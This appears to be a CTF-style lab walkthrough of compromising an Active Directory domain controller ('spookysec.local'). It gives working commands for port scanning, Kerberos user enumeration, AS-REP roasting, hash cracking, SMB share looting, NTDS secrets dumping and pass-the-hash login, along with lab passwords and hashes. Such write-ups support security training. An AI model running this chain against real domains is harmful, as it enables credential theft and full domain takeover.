#ActiveDirectory
### Enumeration
#### nmap
```nmap
sudo nmap -sS -n --open -vvv -Pn -p- --min-rate 5000 machine_ip -oG allPorts
```
Extract ports owo
```nmap
nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49670,49673,49678,49683,49688,49698 machine_ip -oN targeted
```
##### enum4linux
`enum4linux machine_ip`

#### via Kerberos
*Kerberos* -> Kerberos is a key authentication service within Active Directory
With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) to brute force discovery of users, passwords and even password spray!
```kerbrute
./kerbrute_linux_amd64 userenum --dc machine_ip -d spookysec.local users.txt
```

### Abusing Kerberos
#### ASREPRoasting
ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

```
impacket-GetNPUsers spookysec.local/ -dc-ip machine_ip -no-pass -usersfile users.txt -request
```
`$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a5bb47e1b6eceda53ee2a63d7bee627e$93146347505981c744dc235316e683c57799299935be44910a45b2fb5e465b3fa1b2b5fee8c54e48db5a6083cfa0054d002fb3dee042f998ce88c5bc66a2fcf2d16ece16b9215078b7a8c7381d98b995507940c4802c3e845cd9414cc90a94340086031871057d8b9c7e0956db6515c3c48c7b3b4319d31e59a24a1d1b9da6e02b8a4e4d240d8d2afa67ccdbcefa7af06c7e5e87f4cbe4a135f9e6d6ee907310eda0b8fb10bceac9add93f6bd809f2a69d8c7bb9a55918be6cd128d7e8d7d1d6e863c9d2e310819fde1ade340c8942eda1865133537ee7d9d533d92800e6a1262824607ea4ae5a48eca97545d75c8f22780a` 
Crack the Kerberos 5, etype 23, AS-REP hash with hashcat
```hashcat
hashcat -m 18200 -a 0 '$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a5bb47e1b6eceda53ee2a63d7bee627e$9
3146347505981c744dc235316e683c57799299935be44910a45b2fb5e465b3fa1b2b5fee8c54e48db5a6083cfa0054d002fb3dee042f998ce88c5bc66a2fcf2d16ece
16b9215078b7a8c7381d98b995507940c4802c3e845cd9414cc90a94340086031871057d8b9c7e0956db6515c3c48c7b3b4319d31e59a24a1d1b9da6e02b8a4e4d240
d8d2afa67ccdbcefa7af06c7e5e87f4cbe4a135f9e6d6ee907310eda0b8fb10bceac9add93f6bd809f2a69d8c7bb9a55918be6cd128d7e8d7d1d6e863c9d2e310819f
de1ade340c8942eda1865133537ee7d9d533d92800e6a1262824607ea4ae5a48eca97545d75c8f22780a' passwords.txt
```
	User: svc-admin Password:management2005

#### Enumerate with smbclient
Since we have a user and password, smbclient will be used to enumerate the remote shares
```smbclient
smbclient --list=machine_ip --user svc-admin
```
User is prompted for password

Connect to the share `backup`
```smbclient
smbclient //machine_ip/backup --user=svc-admin%management2005
```
Download backup_credentials.txt
`echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 --decode`
backup@spookysec.local:backup2517860%

### Elevating privileges
Dump the admin hash
```
impacket-secretsdump spookysec.local/backup:backup2517860@machine_ip -just-dc-user Administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
```

*Authenticate with the hash usin evil-winrm*
```evil-winrm
evil-winrm -i machine_ip -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
